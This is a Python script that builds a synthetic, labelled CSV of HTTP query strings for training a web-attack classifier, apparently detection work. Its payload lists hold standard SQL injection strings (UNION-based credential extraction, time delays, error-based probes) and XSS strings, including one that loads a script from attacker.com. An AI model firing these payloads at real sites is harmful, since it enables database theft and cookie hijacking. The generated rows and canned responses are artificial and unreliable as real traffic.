import csv
import os
import random

def generate_bootstrap_corpus(output_path="data/raw/http_corpus.csv", n_samples=3000):
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    benign_params = [
        "search=laptop", "page=2", "sort=price_asc", "category=electronics",
        "username=john_doe", "email=user%40example.com", "id=42", "q=cybersecurity",
        "redirect_url=/dashboard", "view=grid", "lang=en-US", "filter=active"
    ]
    
    sqli_params = [
        "id=1' OR '1'='1", "id=1 UNION SELECT null, username, password FROM users--",
        "user=admin'--", "id=1; WAITFOR DELAY '0:0:5'--", "q=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--",
        "sort=IF(1=1, id, name)", "search=1' OR 1=1#"
    ]
    
    xss_params = [
        "q=<script>alert(1)</script>", "search=<img src=x onerror=alert('XSS')>",
        "name=\"><svg onload=confirm(1)>", "term=<iframe src=javascript:alert(1)>",
        "dest=javascript:alert(document.cookie)", "input='><script src=//attacker.com/hook.js></script>"
    ]
    
    rows = []
    
    # 1. Generate Benign samples (label = 0)
    for _ in range(n_samples // 2):
        param = random.choice(benign_params)
        body_length = random.randint(1500, 4500)
        status_code = 200
        response_snippet = "Welcome back, user! Your search results are displayed below."
        rows.append([f"/index.php?{param}", status_code, body_length, response_snippet, 0])
        
    # 2. Generate Attack / Exploit samples (label = 1)
    for _ in range(n_samples // 2):
        if random.random() > 0.5:
            param = random.choice(sqli_params)
            status_code = random.choice([200, 500])
            body_length = random.randint(800, 6000)
            response_snippet = random.choice([
                "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server",
                "Warning: pg_exec(): Query failed: ERROR: syntax error at or near",
                "ODBC Microsoft Access Driver Syntax error in query expression",
                "Database error occurred while processing parameter 'id'"
            ])
        else:
            param = random.choice(xss_params)
            status_code = 200
            body_length = random.randint(1200, 5000)
            response_snippet = f"<div>Search results for: {param.split('=')[1]}</div>"
            
        rows.append([f"/vulnerable.php?{param}", status_code, body_length, response_snippet, 1])

    random.shuffle(rows)
    
    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["raw_query", "status_code", "body_length", "response_body_sample", "label"])
        writer.writerows(rows)
        
    print(f"[+] Successfully generated {len(rows)} samples to {output_path}")

if __name__ == "__main__":
    generate_bootstrap_corpus()
